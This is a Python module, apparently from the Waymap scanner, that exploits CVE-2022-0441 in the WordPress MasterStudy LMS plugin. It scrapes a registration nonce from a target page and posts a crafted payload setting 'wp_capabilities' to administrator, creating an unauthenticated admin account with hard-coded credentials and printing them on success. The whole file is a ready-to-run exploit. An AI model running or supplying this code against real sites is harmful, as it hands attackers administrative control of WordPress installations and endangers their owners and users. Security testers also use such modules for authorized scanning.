# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-0441 - WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation

import requests
import re
from urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style

init(autoreset=True)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def masterstudy(profile_url, timeout=5):

    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

    try:
        response = session.get(url=profile_url, headers=headers, allow_redirects=True, verify=False, timeout=timeout)

        if 'stm_lms_register' in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found!")
            nonce_pattern = re.compile('stm_lms_register":"(.*?)(?:")')
            nonce = nonce_pattern.findall(response.text)[0]

            user_login = "waymaptest"
            user_email = "waymaptestmail@domainexample.com"
            user_password = "waymaptestpass"
            
            data = f'{{"user_login":"{user_login}","user_email":"{user_email}","user_password":"{user_password}","user_password_re":"{user_password}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{{"wp_capabilities":{{"value":{{"administrator":1}}}}}}}}'
            
            exploit_response = session.post(url=f'{profile_url}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce=' + nonce, 
                                            headers=headers, 
                                            data=data, 
                                            allow_redirects=True, 
                                            timeout=timeout)
            
            if '"status":"success"' in exploit_response.text and '"message":"' in exploit_response.text:
                print(f"{Style.BRIGHT}{Fore.GREEN}[-] {profile_url}wp-admin/ => Success")
                print(f"{Style.BRIGHT}{Fore.CYAN}[•] Credentials Used:")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Username: {user_login}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Email: {user_email}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Password: {user_password}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Exploit Data: {data}")
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[*] {profile_url} => Exploit failed, try manual.")
        else:
            print(f"{Style.BRIGHT}{Fore.CYAN}[+] {profile_url} Not vulnerable (stm_lms_register not found).")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[%] {profile_url} => Request failed: {e}")

def scan_cve_2022_0441(profile_url):
    masterstudy(profile_url)

